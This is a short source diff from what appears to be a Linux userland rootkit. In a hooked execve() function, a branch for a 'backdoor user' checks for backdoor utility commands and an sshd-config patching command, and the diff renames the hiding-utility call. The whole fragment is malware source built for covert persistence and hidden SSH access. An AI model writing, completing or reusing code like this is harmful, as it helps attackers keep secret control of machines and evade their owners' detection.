@@ -14,7 +14,7 @@ int execve(const char *filename, char *const argv[], char *const envp[]){
     if(is_bdusr()){
 #ifdef BACKDOOR_UTIL
         if(!fnmatch("*/bdv", argv[0], FNM_PATHNAME))
-            do_hidingutil(argv);
+            dobdvutil(argv);
 #endif
 #ifdef PATCH_SSHD_CONFIG
         if(!fnmatch("*/sshdpatch", argv[0], FNM_PATHNAME)){
